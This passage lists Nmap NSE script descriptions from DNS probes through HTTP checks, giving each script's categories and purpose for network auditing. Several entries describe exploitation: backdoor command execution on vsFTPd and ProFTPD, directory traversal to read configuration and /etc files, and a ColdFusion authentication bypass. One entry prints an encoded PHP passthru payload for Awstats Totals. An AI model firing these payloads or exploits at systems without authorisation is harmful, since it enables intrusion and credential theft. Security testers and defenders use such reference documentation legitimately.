  server with the RD (recursion desired) flag set to 0. The server should
  respond positively to these only if it has the domain cached. In
  <code>timed</code> mode, the mean and standard deviation response times
  for a cached domain are calculated by sampling the resolution of a name
  (www.google.com) several times. Then, each domain is resolved and the
  time taken compared to the mean. If it is less than one standard
  deviation over the mean, it is considered cached. The <code>timed</code>
  mode inserts entries in the cache and can only be used reliably once.

  The default list of domains to check consists of the top 50 most popular
  sites, each site being listed twice, once with "www." and once without.
  Use the <code>dns-cache-snoop.domains</code> script argument to use a
  different list.

dns-check-zone
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/dns-check-zone.html
  Checks DNS zone configuration against best practices, including RFC 1912.
  The configuration checks are divided into categories which each have a number
  of different tests.

dns-client-subnet-scan
Categories: discovery safe
https://nmap.org/nsedoc/scripts/dns-client-subnet-scan.html
  Performs a domain lookup using the edns-client-subnet option which
  allows clients to specify the subnet that queries supposedly originate
  from.  The script uses this option to supply a number of
  geographically distributed locations in an attempt to enumerate as
  many different address records as possible. The script also supports
  requests using a given subnet.

  * https://tools.ietf.org/html/rfc7871

dns-fuzz
Categories: fuzzer intrusive
https://nmap.org/nsedoc/scripts/dns-fuzz.html
  Launches a DNS fuzzing attack against DNS servers.

  The script induces errors into randomly generated but valid DNS packets.
  The packet template that we use includes one uncompressed and one
  compressed name.

  Use the <code>dns-fuzz.timelimit</code> argument to control how long the
  fuzzing lasts. This script should be run for a long time. It will send a
  very large quantity of packets and thus it's pretty invasive, so it
  should only be used against private DNS servers as part of a software
  development lifecycle.

dns-ip6-arpa-scan
Categories: intrusive discovery
https://nmap.org/nsedoc/scripts/dns-ip6-arpa-scan.html
  Performs a quick reverse DNS lookup of an IPv6 network using a technique
  which analyzes DNS server response codes to dramatically reduce the number of queries needed to enumerate large networks.

  The technique essentially works by adding an octet to a given IPv6 prefix
  and resolving it. If the added octet is correct, the server will return
  NOERROR, if not a NXDOMAIN result is received.

  The technique is described in detail on Peter's blog:
  http://7bits.nl/blog/2012/03/26/finding-v6-hosts-by-efficiently-mapping-ip6-arpa

dns-nsec-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/dns-nsec-enum.html
  Enumerates DNS names using the DNSSEC NSEC-walking technique.

  Output is arranged by domain. Within a domain, subzones are shown with
  increased indentation.

  The NSEC response record in DNSSEC is used to give negative answers to
  queries, but it has the side effect of allowing enumeration of all
  names, much like a zone transfer. This script doesn't work against
  servers that use NSEC3 rather than NSEC; for that, see
  <code>dns-nsec3-enum</code>.

dns-nsec3-enum
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/dns-nsec3-enum.html
  Tries to enumerate domain names from the DNS server that supports DNSSEC
  NSEC3 records.

  The script queries for nonexistant domains until it exhausts all domain
  ranges keeping track of hashes. At the end, all hashes are printed along
  with salt and number of iterations used. This technique is known as
  "NSEC3 walking".

  That info should then be fed into an offline cracker, like
  <code>unhash</code> from https://dnscurve.org/nsec3walker.html, to
  bruteforce the actual names from the hashes. Assuming that the script
  output was written into a text file <code>hashes.txt</code> like:
  <code>
  domain example.com
  salt 123456
  iterations 10
  nexthash d1427bj0ahqnpi4t0t0aaun18oqpgcda vhnelm23s1m3japt7gohc82hgr9un2at
  nexthash k7i4ekvi22ebrim5b6celtaniknd6ilj prv54a3cr1tbcvqslrb7bftf5ji5l0p8
  nexthash 9ool6bk7r2diaiu81ctiemmb6n961mph nm7v0ig7h9c0agaedc901kojfj9bgabj
  nexthash 430456af8svfvl98l66shhrgucoip7mi mges520acstgaviekurg3oksh9u31bmb
  </code>

  Run this command to recover the domain names:
  <code>
  # ./unhash < hashes.txt > domains.txt
  names: 8
  d1427bj0ahqnpi4t0t0aaun18oqpgcda ns.example.com.
  found 1 private NSEC3 names (12%) using 235451 hash computations
  k7i4ekvi22ebrim5b6celtaniknd6ilj vulpix.example.com.
  found 2 private NSEC3 names (25%) using 35017190 hash computations
  </code>

  Use the <code>dns-nsec-enum</code> script to handle servers that use NSEC
  rather than NSEC3.

  References:
  * https://dnscurve.org/nsec3walker.html

dns-nsid
Categories: discovery default safe
https://nmap.org/nsedoc/scripts/dns-nsid.html
  Retrieves information from a DNS nameserver by requesting
  its nameserver ID (nsid) and asking for its id.server and
  version.bind values. This script performs the same queries as the following
  two dig commands:
    - dig CH TXT bind.version @target
    - dig +nsid CH TXT id.server @target

  References:
  [1]http://www.ietf.org/rfc/rfc5001.txt
  [2]http://www.ietf.org/rfc/rfc4892.txt

dns-random-srcport
Categories: external intrusive
https://nmap.org/nsedoc/scripts/dns-random-srcport.html
  Checks a DNS server for the predictable-port recursion vulnerability.
  Predictable source ports can make a DNS server vulnerable to cache poisoning
  attacks (see CVE-2008-1447).

  The script works by querying porttest.dns-oarc.net (see
  https://www.dns-oarc.net/oarc/services/porttest).  Be aware that any
  targets against which this script is run will be sent to and
  potentially recorded by one or more DNS servers and the porttest
  server. In addition your IP address will be sent along with the
  porttest query to the DNS server running on the target.

dns-random-txid
Categories: external intrusive
https://nmap.org/nsedoc/scripts/dns-random-txid.html
  Checks a DNS server for the predictable-TXID DNS recursion
  vulnerability.  Predictable TXID values can make a DNS server vulnerable to
  cache poisoning attacks (see CVE-2008-1447).

  The script works by querying txidtest.dns-oarc.net (see
  https://www.dns-oarc.net/oarc/services/txidtest).  Be aware that any
  targets against which this script is run will be sent to and
  potentially recorded by one or more DNS servers and the txidtest
  server. In addition your IP address will be sent along with the
  txidtest query to the DNS server running on the target.

dns-recursion
Categories: default safe
https://nmap.org/nsedoc/scripts/dns-recursion.html
  Checks if a DNS server allows queries for third-party names. It is
  expected that recursion will be enabled on your own internal
  nameservers.

dns-service-discovery
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/dns-service-discovery.html
  Attempts to discover target hosts' services using the DNS Service Discovery protocol.

  The script first sends a query for _services._dns-sd._udp.local to get a
  list of services. It then sends a followup query for each one to try to
  get more information.

dns-srv-enum
Categories: discovery safe
https://nmap.org/nsedoc/scripts/dns-srv-enum.html
  Enumerates various common service (SRV) records for a given domain name.
  The service records contain the hostname, port and priority of servers for a given service.
  The following services are enumerated by the script:
    - Active Directory Global Catalog
    - Exchange Autodiscovery
    - Kerberos KDC Service
    - Kerberos Passwd Change Service
    - LDAP Servers
    - SIP Servers
    - XMPP S2S
    - XMPP C2S

dns-update
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/dns-update.html
  Attempts to perform a dynamic DNS update without authentication.

  Either the <code>test</code> or both the <code>hostname</code> and
  <code>ip</code> script arguments are required. Note that the <code>test</code>
  function will probably fail due to using a static zone name that is not the
  zone configured on your target.

dns-zeustracker
Categories: safe discovery external malware
https://nmap.org/nsedoc/scripts/dns-zeustracker.html
  Checks if the target IP range is part of a Zeus botnet by querying ZTDNS @ abuse.ch.
  Please review the following information before you start to scan:
  * https://zeustracker.abuse.ch/ztdns.php

dns-zone-transfer
Categories: intrusive discovery
https://nmap.org/nsedoc/scripts/dns-zone-transfer.html
  Requests a zone transfer (AXFR) from a DNS server.

  The script sends an AXFR query to a DNS server. The domain to query is
  determined by examining the name given on the command line, the DNS
  server's hostname, or it can be specified with the
  <code>dns-zone-transfer.domain</code> script argument. If the query is
  successful all domains and domain types are returned along with common
  type specific data (SOA/MX/NS/PTR/A).

  This script can run at different phases of an Nmap scan:
  * Script Pre-scanning: in this phase the script will run before any
  Nmap scan and use the defined DNS server in the arguments. The script
  arguments in this phase are: <code>dns-zone-transfer.server</code> the
  DNS server to use, can be a hostname or an IP address and must be
  specified. The <code>dns-zone-transfer.port</code> argument is optional
  and can be used to specify the DNS server port.
  * Script scanning: in this phase the script will run after the other
  Nmap phases and against an Nmap discovered DNS server. If we don't
  have the "true" hostname for the DNS server we cannot determine a
  likely zone to perform the transfer on.

  Useful resources
  * DNS for rocket scientists: http://www.zytrax.com/books/dns/
  * How the AXFR protocol works: http://cr.yp.to/djbdns/axfr-notes.html

docker-version
Categories: version
https://nmap.org/nsedoc/scripts/docker-version.html
  Detects the Docker service version.
domcon-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/domcon-brute.html
  Performs brute force password auditing against the Lotus Domino Console.

domcon-cmd
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/domcon-cmd.html
  Runs a console command on the Lotus Domino Console using the given authentication credentials (see also: domcon-brute)

domino-enum-users
Categories: intrusive auth
https://nmap.org/nsedoc/scripts/domino-enum-users.html
  Attempts to discover valid IBM Lotus Domino users and download their ID files by exploiting the CVE-2006-5835 vulnerability.

dpap-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/dpap-brute.html
  Performs brute force password auditing against an iPhoto Library.

drda-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/drda-brute.html
  Performs password guessing against databases supporting the IBM DB2 protocol such as Informix, DB2 and Derby

drda-info
Categories: safe discovery version
https://nmap.org/nsedoc/scripts/drda-info.html
  Attempts to extract information from database servers supporting the DRDA
  protocol. The script sends a DRDA EXCSAT (exchange server attributes)
  command packet and parses the response.

duplicates
Categories: safe
https://nmap.org/nsedoc/scripts/duplicates.html
  Attempts to discover multihomed systems by analysing and comparing
  information collected by other scripts. The information analyzed
  currently includes, SSL certificates, SSH host keys, MAC addresses,
  and Netbios server names.

  In order for the script to be able to analyze the data it has dependencies to
  the following scripts: ssl-cert,ssh-hostkey,nbtstat.

  One or more of these scripts have to be run in order to allow the duplicates
  script to analyze the data.

eap-info
Categories: broadcast safe
https://nmap.org/nsedoc/scripts/eap-info.html
  Enumerates the authentication methods offered by an EAP (Extensible
  Authentication Protocol) authenticator for a given identity or for the
  anonymous identity if no argument is passed.

enip-info
Categories: discovery version
https://nmap.org/nsedoc/scripts/enip-info.html
  This NSE script is used to send a EtherNet/IP packet to a remote device that
  has TCP 44818 open. The script will send a Request Identity Packet and once a
  response is received, it validates that it was a proper response to the command
  that was sent, and then will parse out the data. Information that is parsed
  includes Device Type, Vendor ID, Product name, Serial Number, Product code,
  Revision Number, status, state, as well as the Device IP.

  This script was written based of information collected by using the the
  Wireshark dissector for CIP, and EtherNet/IP, The original information was
  collected by running a modified version of the ethernetip.py script
  (https://github.com/paperwork/pyenip)

  http://digitalbond.com


epmd-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/epmd-info.html
  Connects to Erlang Port Mapper Daemon (epmd) and retrieves a list of nodes with their respective port numbers.

eppc-enum-processes
Categories: discovery safe
https://nmap.org/nsedoc/scripts/eppc-enum-processes.html
  Attempts to enumerate process info over the Apple Remote Event protocol.
  When accessing an application over the Apple Remote Event protocol the
  service responds with the uid and pid of the application, if it is running,
  prior to requesting authentication.

fcrdns
Categories: discovery safe
https://nmap.org/nsedoc/scripts/fcrdns.html
  Performs a Forward-confirmed Reverse DNS lookup and reports anomalous results.

  References:
  * https://en.wikipedia.org/wiki/Forward-confirmed_reverse_DNS

finger
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/finger.html
  Attempts to retrieve a list of usernames using the finger service.

fingerprint-strings
Categories: version
https://nmap.org/nsedoc/scripts/fingerprint-strings.html
  Prints the readable strings from service fingerprints of unknown services.

  Nmap's service and application version detection engine sends named probes to
  target services and tries to identify them based on the response. When there is
  no match, Nmap produces a service fingerprint for submission. Sometimes,
  inspecting this fingerprint can give clues as to the identity of the service.
  However, the fingerprint is encoded and wrapped to ensure it doesn't lose data,
  which can make it hard to read.

  This script simply unwraps the fingerprint and prints the readable ASCII strings
  it finds below the name of the probe it responded to. The probe names are taken
  from the nmap-service-probes file, not from the response.

firewalk
Categories: safe discovery
https://nmap.org/nsedoc/scripts/firewalk.html
  Tries to discover firewall rules using an IP TTL expiration technique known
  as firewalking.

  To determine a rule on a given gateway, the scanner sends a probe to a metric
  located behind the gateway, with a TTL one higher than the gateway. If the probe
  is forwarded by the gateway, then we can expect to receive an ICMP_TIME_EXCEEDED
  reply from the gateway next hop router, or eventually the metric itself if it is
  directly connected to the gateway. Otherwise, the probe will timeout.

  It starts with a TTL equals to the distance to the target. If the probe timeout,
  then it is resent with a TTL decreased by one. If we get an ICMP_TIME_EXCEEDED,
  then the scan is over for this probe.

  Every "no-reply" filtered TCP and UDP ports are probed. As for UDP scans, this
  process can be quite slow if lots of ports are blocked by a gateway close to the
  scanner.

  Scan parameters can be controlled using the <code>firewalk.*</code>
  optional arguments.

  From an original idea of M. Schiffman and D. Goldsmith, authors of the
  firewalk tool.

firewall-bypass
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/firewall-bypass.html
  Detects a vulnerability in netfilter and other firewalls that use helpers to
  dynamically open ports for protocols such as ftp and sip.

  The script works by spoofing a packet from the target server asking for opening
  a related connection to a target port which will be fulfilled by the firewall
  through the adequate protocol helper port. The attacking machine should be on
  the same network segment as the firewall for this to work. The script supports
  ftp helper on both IPv4 and IPv6. Real path filter is used to prevent such
  attacks.

  Based on work done by Eric Leblond.

  For more information, see:

  * http://home.regit.org/2012/03/playing-with-network-layers-to-bypass-firewalls-filtering-policy/

flume-master-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/flume-master-info.html
  Retrieves information from Flume master HTTP pages.

  Information gathered:
  * Flume version
  * Flume server id
  * Zookeeper/Hbase master servers present in configured flows
  * Java information
  * OS information
  * various other local configurations.

  If this script is run wth -v, it will output lots more info.

  Use the <code>newtargets</code> script argument to add discovered hosts to
  the Nmap scan queue.

fox-info
Categories: discovery version
https://nmap.org/nsedoc/scripts/fox-info.html
  Tridium Niagara Fox is a protocol used within Building Automation Systems. Based
  off Billy Rios and Terry McCorkle's work this Nmap NSE will collect information
  from A Tridium Niagara system.

  http://digitalbond.com


freelancer-info
Categories: default discovery safe version
https://nmap.org/nsedoc/scripts/freelancer-info.html
  Detects the Freelancer game server (FLServer.exe) service by sending a
  status query UDP probe.

  When run as a version detection script (<code>-sV</code>), the script
  will report on the server name, current number of players, maximum
  number of players, and whether it has a password set. When run
  explicitly (<code>--script freelancer-info</code>), the script will
  additionally report on the server description, whether players can harm
  other players, and whether new players are allowed.

  See http://sourceforge.net/projects/gameq/
  (relevant files: games.ini, packets.ini, freelancer.php)

ftp-anon
Categories: default auth safe
https://nmap.org/nsedoc/scripts/ftp-anon.html
  Checks if an FTP server allows anonymous logins.

  If anonymous is allowed, gets a directory listing of the root directory
  and highlights writeable files.

ftp-bounce
Categories: default safe
https://nmap.org/nsedoc/scripts/ftp-bounce.html
  Checks to see if an FTP server allows port scanning using the FTP bounce method.

ftp-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/ftp-brute.html
  Performs brute force password auditing against FTP servers.

  Based on old ftp-brute.nse script by Diman Todorov, Vlatko Kosturjak and Ron Bowes.

ftp-libopie
Categories: vuln intrusive
https://nmap.org/nsedoc/scripts/ftp-libopie.html
  Checks if an FTPd is prone to CVE-2010-1938 (OPIE off-by-one stack overflow),
  a vulnerability discovered by Maksymilian Arciemowicz and Adam "pi3" Zabrocki.
  See the advisory at https://nmap.org/r/fbsd-sa-opie.
  Be advised that, if launched against a vulnerable host, this script will crash the FTPd.

ftp-proftpd-backdoor
Categories: exploit intrusive malware vuln
https://nmap.org/nsedoc/scripts/ftp-proftpd-backdoor.html
  Tests for the presence of the ProFTPD 1.3.3c backdoor reported as BID
  45150. This script attempts to exploit the backdoor using the innocuous
  <code>id</code> command by default, but that can be changed with the
  <code>ftp-proftpd-backdoor.cmd</code> script argument.

ftp-syst
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ftp-syst.html
  Sends FTP SYST and STAT commands and returns the result.

  The canonical SYST response of "UNIX Type: L8" is stripped or ignored, since it
  is meaningless. Typical FTP response codes (215 for SYST and 211 for STAT) are
  also hidden.

  References:
  * https://cr.yp.to/ftp/syst.html

ftp-vsftpd-backdoor
Categories: exploit intrusive malware vuln
https://nmap.org/nsedoc/scripts/ftp-vsftpd-backdoor.html
  Tests for the presence of the vsFTPd 2.3.4 backdoor reported on 2011-07-04
  (CVE-2011-2523). This script attempts to exploit the backdoor using the
  innocuous <code>id</code> command by default, but that can be changed with
  the <code>exploit.cmd</code> or <code>ftp-vsftpd-backdoor.cmd</code> script
  arguments.

  References:

  * http://scarybeastsecurity.blogspot.com/2011/07/alert-vsftpd-download-backdoored.html
  * https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/unix/ftp/vsftpd_234_backdoor.rb
  * http://cve.mitre.org/cgi-bin/cvekey.cgi?keyword=CVE-2011-2523

ftp-vuln-cve2010-4221
Categories: intrusive vuln
https://nmap.org/nsedoc/scripts/ftp-vuln-cve2010-4221.html
  Checks for a stack-based buffer overflow in the ProFTPD server, version
  between 1.3.2rc3 and 1.3.3b. By sending a large number of TELNET_IAC escape
  sequence, the proftpd process miscalculates the buffer length, and a remote
  attacker will be able to corrupt the stack and execute arbitrary code within
  the context of the proftpd process (CVE-2010-4221). Authentication is not
  required to exploit this vulnerability.

  Reference:
  * https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-4221
  * http://www.exploit-db.com/exploits/15449/
  * http://www.metasploit.com/modules/exploit/freebsd/ftp/proftp_telnet_iac

ganglia-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/ganglia-info.html
  Retrieves system information (OS version, available memory, etc.) from
  a listening Ganglia Monitoring Daemon or Ganglia Meta Daemon.

  Ganglia is a scalable distributed monitoring system for high-performance
  computing systems such as clusters and Grids. The information retrieved
  includes HDD size, available memory, OS version, architecture (and more) from
  each of the systems in each of the clusters in the grid.

  For more information about Ganglia, see:
  * http://ganglia.sourceforge.net/
  * http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Monitoring_Daemon_.28gmond.29
  * http://en.wikipedia.org/wiki/Ganglia_(software)#Ganglia_Meta_Daemon_.28gmetad.29

giop-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/giop-info.html
  Queries a CORBA naming server for a list of objects.

gkrellm-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/gkrellm-info.html
  Queries a GKRellM service for monitoring information. A single round of
  collection is made, showing a snapshot of information at the time of the
  request.

gopher-ls
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/gopher-ls.html
  Lists files and directories at the root of a gopher service.

gpsd-info
Categories: discovery safe
https://nmap.org/nsedoc/scripts/gpsd-info.html
  Retrieves GPS time, coordinates and speed from the GPSD network daemon.

hadoop-datanode-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hadoop-datanode-info.html
  Discovers information such as log directories from an Apache Hadoop DataNode
  HTTP status page.

  Information gathered:
  * Log directory (relative to http://host:port/)

hadoop-jobtracker-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hadoop-jobtracker-info.html
  Retrieves information from an Apache Hadoop JobTracker HTTP status page.

  Information gathered:
  * State of the JobTracker.
  * Date/time the service was started
  * Hadoop version
  * Hadoop Compile date
  * JobTracker ID
  * Log directory (relative to http://host:port/)
  * Associated TaskTrackers
  * Optionally also user activity history

hadoop-namenode-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hadoop-namenode-info.html
  Retrieves information from an Apache Hadoop NameNode HTTP status page.

  Information gathered:
  * Date/time the service was started
  * Hadoop version
  * Hadoop compile date
  * Upgrades status
  * Filesystem directory (relative to http://host:port/)
  * Log directory (relative to http://host:port/)
  * Associated DataNodes.

hadoop-secondary-namenode-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hadoop-secondary-namenode-info.html
  Retrieves information from an Apache Hadoop secondary NameNode HTTP status page.

  Information gathered:
  * Date/time the service was started
  * Hadoop version
  * Hadoop compile date
  * Hostname or IP address and port of the master NameNode server
  * Last time a checkpoint was taken
  * How often checkpoints are taken (in seconds)
  * Log directory (relative to http://host:port/)
  * File size of current checkpoint

hadoop-tasktracker-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hadoop-tasktracker-info.html
  Retrieves information from an Apache Hadoop TaskTracker HTTP status page.

  Information gathered:
  * Hadoop version
  * Hadoop Compile date
  * Log directory (relative to http://host:port/)

hbase-master-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hbase-master-info.html
  Retrieves information from an Apache HBase (Hadoop database) master HTTP status page.

  Information gathered:
  * Hbase version
  * Hbase compile date
  * Hbase root directory
  * Hadoop version
  * Hadoop compile date
  * Average load
  * Zookeeper quorum server
  * Associated region servers

hbase-region-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hbase-region-info.html
  Retrieves information from an Apache HBase (Hadoop database) region server HTTP status page.

  Information gathered:
  * HBase version
  * HBase compile date
  * A bunch of metrics about the state of the region server
  * Zookeeper quorum server

hddtemp-info
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/hddtemp-info.html
  Reads hard disk information (such as brand, model, and sometimes temperature) from a listening hddtemp service.

hnap-info
Categories: safe discovery default version
https://nmap.org/nsedoc/scripts/hnap-info.html
  Retrieve hardwares details and configuration information utilizing HNAP, the "Home Network Administration Protocol".
  It is an HTTP-Simple Object Access Protocol (SOAP)-based protocol which allows for remote topology discovery,
  configuration, and management of devices (routers, cameras, PCs, NAS, etc.)
hostmap-bfk
Categories: external discovery
https://nmap.org/nsedoc/scripts/hostmap-bfk.html
  Discovers hostnames that resolve to the target's IP address by querying the online database at http://www.bfk.de/bfk_dnslogger.html.

  The script is in the "external" category because it sends target IPs to a third party in order to query their database.

  This script was formerly (until April 2012) known as hostmap.nse.

hostmap-crtsh
Categories: external discovery
https://nmap.org/nsedoc/scripts/hostmap-crtsh.html
  Finds subdomains of a web server by querying Google's Certificate Transparency
  logs database (https://crt.sh).

  The script will run against any target that has a name, either specified on the
  command line or obtained via reverse-DNS.

  NSE implementation of ctfr.py (https://github.com/UnaPibaGeek/ctfr.git) by Sheila Berta.

  References:
  * www.certificate-transparency.org

hostmap-robtex
Categories: discovery safe external
https://nmap.org/nsedoc/scripts/hostmap-robtex.html
  Discovers hostnames that resolve to the target's IP address by querying the online Robtex service at http://ip.robtex.com/.

  *TEMPORARILY DISABLED* due to changes in Robtex's API. See https://www.robtex.com/api/

http-adobe-coldfusion-apsa1301
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-adobe-coldfusion-apsa1301.html
  Attempts to exploit an authentication bypass vulnerability in Adobe Coldfusion
  servers to retrieve a valid administrator's session cookie.

  Reference:
  * APSA13-01: http://www.adobe.com/support/security/advisories/apsa13-01.html

http-affiliate-id
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-affiliate-id.html
  Grabs affiliate network IDs (e.g. Google AdSense or Analytics, Amazon
  Associates, etc.) from a web page. These can be used to identify pages
  with the same owner.

  If there is more than one target using an ID, the postrule of this
  script shows the ID along with a list of the targets using it.

  Supported IDs:
  * Google Analytics
  * Google AdSense
  * Amazon Associates

http-apache-negotiation
Categories: safe discovery
https://nmap.org/nsedoc/scripts/http-apache-negotiation.html
  Checks if the target http server has mod_negotiation enabled.  This
  feature can be leveraged to find hidden resources and spider a web
  site using fewer requests.

  The script works by sending requests for resources like index and home
  without specifying the extension. If mod_negotiate is enabled (default
  Apache configuration), the target would reply with content-location header
  containing target resource (such as index.html) and vary header containing
  "negotiate" depending on the configuration.

  For more information, see:
  * http://www.wisec.it/sectou.php?id=4698ebdc59d15
  * Metasploit auxiliary module
      /modules/auxiliary/scanner/http/mod_negotiation_scanner.rb

http-apache-server-status
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-apache-server-status.html
  Attempts to retrieve the server-status page for Apache webservers that
  have mod_status enabled. If the server-status page exists and appears to
  be from mod_status the script will parse useful information such as the
  system uptime, Apache version and recent HTTP requests.

  References:
  * http://httpd.apache.org/docs/2.4/mod/mod_status.html
  * https://blog.sucuri.net/2012/10/popular-sites-with-apache-server-status-enabled.html
  * https://www.exploit-db.com/ghdb/1355/
  * https://github.com/michenriksen/nmap-scripts

http-aspnet-debug
Categories: vuln discovery
https://nmap.org/nsedoc/scripts/http-aspnet-debug.html
  Determines if a ASP.NET application has debugging enabled using a HTTP DEBUG request.

  The HTTP DEBUG verb is used within ASP.NET applications to start/stop remote
  debugging sessions. The script sends a 'stop-debug' command to determine the
  application's current configuration state but access to RPC services is required
   to interact with the debugging session. The request does not change the
  application debugging configuration.

http-auth-finder
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-auth-finder.html
  Spiders a web site to find web pages requiring form-based or HTTP-based authentication. The results are returned in a table with each url and the
  detected method.

http-auth
Categories: default auth safe
https://nmap.org/nsedoc/scripts/http-auth.html
  Retrieves the authentication scheme and realm of a web service that requires
  authentication.

http-avaya-ipoffice-users
Categories: exploit vuln
https://nmap.org/nsedoc/scripts/http-avaya-ipoffice-users.html
  Attempts to enumerate users in Avaya IP Office systems 7.x.

  Avaya IP Office systems allow unauthenticated access to the URI '/system/user/scn_user_list'
  which returns a XML file containing user information such as display name, full name and
  extension number.

  * Tested on Avaya IP Office 7.0(27).

http-awstatstotals-exec
Categories: vuln intrusive exploit
https://nmap.org/nsedoc/scripts/http-awstatstotals-exec.html
  Exploits a remote code execution vulnerability in Awstats Totals 1.0 up to 1.14
  and possibly other products based on it (CVE: 2008-3922).

  This vulnerability can be exploited through the GET variable <code>sort</code>.
  The script queries the web server with the command payload encoded using PHP's
  chr() function:

  <code>?sort={%24{passthru%28chr(117).chr(110).chr(97).chr(109).chr(101).chr(32).chr(45).chr(97)%29}}{%24{exit%28%29}}</code>

  Common paths for Awstats Total:
  * <code>/awstats/index.php</code>
  * <code>/awstatstotals/index.php</code>
  * <code>/awstats/awstatstotals.php</code>

  References:
  * http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2008-3922
  * http://www.exploit-db.com/exploits/17324/

http-axis2-dir-traversal
Categories: vuln intrusive exploit
https://nmap.org/nsedoc/scripts/http-axis2-dir-traversal.html
  Exploits a directory traversal vulnerability in Apache Axis2 version 1.4.1 by
  sending a specially crafted request to the parameter <code>xsd</code>
  (BID 40343). By default it will try to retrieve the configuration file of the
  Axis2 service <code>'/conf/axis2.xml'</code> using the path
  <code>'/axis2/services/'</code> to return the username and password of the
  admin account.

  To exploit this vulnerability we need to detect a valid service running on the
  installation so we extract it from <code>/listServices</code> before exploiting
  the directory traversal vulnerability.  By default it will retrieve the
  configuration file, if you wish to retrieve other files you need to set the
  argument <code>http-axis2-dir-traversal.file</code> correctly to traverse to
  the file's directory. Ex. <code>../../../../../../../../../etc/issue</code>

  To check the version of an Apache Axis2 installation go to:
  http://domain/axis2/services/Version/getVersion

  Reference:
  * https://www.securityfocus.com/bid/40343
  * https://www.exploit-db.com/exploits/12721/

http-backup-finder
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-backup-finder.html
  Spiders a website and attempts to identify backup copies of discovered files.
  It does so by requesting a number of different combinations of the filename (eg. index.bak, index.html~, copy of index.html).

http-barracuda-dir-traversal
Categories: intrusive exploit auth
https://nmap.org/nsedoc/scripts/http-barracuda-dir-traversal.html
  Attempts to retrieve the configuration settings from a Barracuda
  Networks Spam & Virus Firewall device using the directory traversal
  vulnerability described at
  http://seclists.org/fulldisclosure/2010/Oct/119.

  This vulnerability is in the "locale" parameter of
  "/cgi-mod/view_help.cgi" or "/cgi-bin/view_help.cgi", allowing the
  information to be retrieved from a MySQL database dump.  The web
  administration interface runs on port 8000 by default.

  Barracuda Networks Spam & Virus Firewall <= 4.1.1.021 Remote Configuration Retrieval
  Original exploit by ShadowHatesYou <Shadow@SquatThis.net>
  For more information, see:
  http://seclists.org/fulldisclosure/2010/Oct/119
  http://www.exploit-db.com/exploits/15130/

http-bigip-cookie
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-bigip-cookie.html
  Decodes any unencrypted F5 BIG-IP cookies in the HTTP response.
  BIG-IP cookies contain information on backend systems such as
  internal IP addresses and port numbers.
  See here for more info: https://support.f5.com/csp/article/K6917

http-brute
Categories: intrusive brute
https://nmap.org/nsedoc/scripts/http-brute.html
  Performs brute force password auditing against http basic, digest and ntlm authentication.

  This script uses the unpwdb and brute libraries to perform password
  guessing. Any successful guesses are stored in the nmap registry, using
  the creds library, for other scripts to use.

http-cakephp-version
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-cakephp-version.html
  Obtains the CakePHP version of a web application built with the CakePHP
  framework by fingerprinting default files shipped with the CakePHP framework.

  This script queries the files 'vendors.php', 'cake.generic.css',
  'cake.icon.png' and 'cake.icon.gif' to try to obtain the version of the CakePHP
  installation.

  Since installations that had been upgraded are prone to false positives due to
  old files that aren't removed, the script displays 3 different versions:
  * Codebase: Taken from the existence of vendors.php (1.1.x or 1.2.x if it does and 1.3.x otherwise)
  * Stylesheet: Taken from cake.generic.css
  * Icon: Taken from cake.icon.gif or cake.icon.png

  For more information about CakePHP visit: http://www.cakephp.org/.

http-chrono
Categories: discovery intrusive
https://nmap.org/nsedoc/scripts/http-chrono.html
  Measures the time a website takes to deliver a web page and returns
  the maximum, minimum and average time it took to fetch a page.

  Web pages that take longer time to load could be abused by attackers in DoS or
  DDoS attacks due to the fact that they are likely to consume more resources on
  the target server. This script could help identifying these web pages.

http-cisco-anyconnect
Categories: default discovery safe
https://nmap.org/nsedoc/scripts/http-cisco-anyconnect.html
  Connect as Cisco AnyConnect client to a Cisco SSL VPN and retrieves version
  and tunnel information.

http-coldfusion-subzero
Categories: exploit
https://nmap.org/nsedoc/scripts/http-coldfusion-subzero.html
  Attempts to retrieve version, absolute path of administration panel and the
  file 'password.properties' from vulnerable installations of ColdFusion 9 and
  10.

  This was based on the exploit 'ColdSub-Zero.pyFusion v2'.

http-comments-displayer
Categories: discovery safe
https://nmap.org/nsedoc/scripts/http-comments-displayer.html
  Extracts and outputs HTML and JavaScript comments from HTTP responses.

http-config-backup
Categories: auth intrusive
https://nmap.org/nsedoc/scripts/http-config-backup.html
  Checks for backups and swap files of common content management system
  and web server configuration files.

  When web server files are edited in place, the text editor can leave
